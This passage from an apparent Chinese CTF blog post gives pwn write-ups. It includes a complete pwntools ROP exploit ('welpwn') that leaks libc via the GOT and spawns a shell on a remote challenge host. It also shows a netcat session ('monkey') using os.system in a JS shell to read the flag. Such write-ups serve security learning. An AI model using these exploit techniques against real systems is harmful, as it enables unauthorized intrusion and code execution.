class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2019/11/07/5dc3d67635dfe/">https://www.dazhuanlan.com/2019/11/07/5dc3d67635dfe/</a></p>
+<p>用ctfwiki提供的脚本比较快，自己试挺麻烦的…（还是不太熟练</p>
+<h2 id="welpwn">welpwn</h2>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./8&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">32410</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./8&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc6_2.23-0ubuntu10_amd64</span></span><br><span class="line">sys_off = <span class="number">0x045390</span></span><br><span class="line">write_off = <span class="number">0x0f72b0</span></span><br><span class="line">binsh_off = <span class="number">0x18cd57</span></span><br><span class="line"></span><br><span class="line">pop = <span class="number">0x40089c</span></span><br><span class="line">pop_rdi = <span class="number">0x04008a3</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span> + p64(pop) + p64(pop_rdi) + p64(write_got) + p64(puts_plt) + p64(<span class="number">0x4007CD</span>)</span><br><span class="line"><span class="comment">#0x18+pop(8个字节)用于复制（下一个函数）后填充第二个栈到返回地址，然后将write的got表pop到rdi，用puts输出，返回到main函数的开头，设置环境</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write_addr = p.recvuntil(&quot;\\&quot;)</span></span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&quot;\x40&quot;</span>)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\00&#x27;</span>))</span><br><span class="line">write_addr = <span class="built_in">int</span>(write_addr)</span><br><span class="line"><span class="built_in">print</span> write_addr</span><br><span class="line">base = write_addr - write_off</span><br><span class="line">sys = base + sys_off</span><br><span class="line">binsh = binsh_off + base</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span> + p64(pop) + p64(pop_rdi) + p64(binsh) + p64(sys)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>好像服务器上和本地程序用的libc又不一样…所以连接完远程服务器后再获得一次write的got表，然后找到libc版本</p>
+<p>主要学到了这个方法：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\00&#x27;</span>))</span><br></pre></td></tr></table></figure>
+<p>将接收到的数字左对齐，并用’\00’填充为8位，</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://muzibing.github.io/2020/06/12/2020.06.12%EF%BC%88125%EF%BC%89">https://muzibing.github.io/2020/06/12/2020.06.12（125）</a></p>
+<h2 id="monkey">monkey</h2>
+<p>考察js shell</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ nc <span class="number">220.249</span><span class="number">.52</span><span class="number">.133</span> <span class="number">56451</span></span><br><span class="line">js&gt; os.system(<span class="string">&quot;pwd&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;pwd&quot;</span>)</span><br><span class="line">/home/ctf</span><br><span class="line">js&gt; os.system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">js</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libnspr4.so</span><br><span class="line">libplc4.so</span><br><span class="line">libplds4.so</span><br><span class="line">run.sh</span><br><span class="line">js&gt; os.system(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">cyberpeace&#123;xxxxxxx&#125;</span><br></pre></td></tr></table></figure>
+<h2 id=""></h2>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/62497.html" rel="prev" title="【翻译】A Survey of Security Vulnerability Analysis,Discovery, Detection, and Mitigation on IoT Devices">
+                  <i class="fa fa-chevron-left"></i> 【翻译】A Survey of Security Vulnerability Analysis,Discovery, Detection, and Mitigation on IoT Devices
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/54551.html" rel="next" title="第六届网络空间安全技术赛pwn">
+                  第六届网络空间安全技术赛pwn <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bruce</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9943095847270020"
+     crossorigin="anonymous"></script>
+<!-- 1 -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-9943095847270020"
+     data-ad-slot="9629035599"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.18/dist/katex.min.css" integrity="sha256-M6KFoDq9eUpmogkDgw6+3R3ZgUPSuFXnQyr8tskSfQs=" crossorigin="anonymous">
+
+
+
+</body>
+</html>
